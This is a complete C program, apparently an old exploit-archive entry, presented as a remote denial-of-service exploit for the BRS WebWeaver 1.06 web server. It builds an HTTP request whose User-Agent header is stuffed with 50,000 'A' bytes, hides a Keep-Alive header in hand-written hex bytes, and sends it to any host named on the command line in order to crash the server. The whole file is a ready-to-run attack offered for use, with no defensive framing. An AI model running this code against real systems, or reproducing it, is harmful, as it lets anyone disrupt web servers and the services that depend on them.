/*
 *  BRS WebWeaver v.1.06 remote DoS exploit
 *
 * -d4rkgr3y [d4rk@securitylab.ru]
 *
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>

#define port 80

main(int argc, char **argv) {
        struct hostent *hs;
        struct sockaddr_in sock;
        int sockfd, i;
        const c = 50000;
        char request[50150] =
                "GET /m00-r0cz HTTP/1.0\n"
                "Accept: */*\n"
                "Accept-Language: jp\n"
                "Accept-Encoding: gzip, deflate\n"
                "Host: m00security.org\n"
                "User-Agent: ";
        printf("BRS WebWeaver v.1.06 remote DoS exploit\n\n");

        if (argc!=2){
                printf("usage\n %s hostname\n\n",argv[0]);
                exit(1);
        }

        //memset((request+98),0x41,c);
        memset((request+strlen(request)),0x41,c);
        /* l33t ;] */
        request[strlen(request)] = 0x0a;
        request[strlen(request)] = 0x43;
        request[strlen(request)] = 0x6f;
        request[strlen(request)] = 0x6e;
        request[strlen(request)] = 0x6e;
        request[strlen(request)] = 0x65;
        request[strlen(request)] = 0x63;
        request[strlen(request)] = 0x74;
        request[strlen(request)] = 0x69;
        request[strlen(request)] = 0x6f;
        request[strlen(request)] = 0x6e;
        request[strlen(request)] = 0x3a;
        request[strlen(request)] = 0x20;
        request[strlen(request)] = 0x4b;
        request[strlen(request)] = 0x65;
        request[strlen(request)] = 0x65;
request[strlen(request)] = 0x70;
        request[strlen(request)] = 0x2d;
        request[strlen(request)] = 0x41;
        request[strlen(request)] = 0x6c;
        request[strlen(request)] = 0x69;
        request[strlen(request)] = 0x76;
        request[strlen(request)] = 0x65;
        request[strlen(request)] = 0x0a;
        request[strlen(request)] = 0x0a;

        bzero(&sock, sizeof(sock));
        sock.sin_family = AF_INET;
        sock.sin_port = htons(port);
        if ((sock.sin_addr.s_addr=inet_addr(argv[1]))==-1) {
                if ((hs=gethostbyname(argv[1]))==NULL) {
                        printf("damn");
                        exit(1);
                }
                printf("~ Host resolved.\n");
                sock.sin_family = hs->h_addrtype;
                
memcpy((caddr_t)&sock.sin_addr.s_addr,hs->h_addr,hs->h_length);
        }
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                perror("damn");  exit(0);
        }

        if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0){
                perror("damn"); exit(0);
        }
        printf("~ Socket connected\n");
        printf("~ Sending evil code... ");
        write(sockfd,request,strlen(request));
        printf("done\n\n");
        close(sockfd);
}

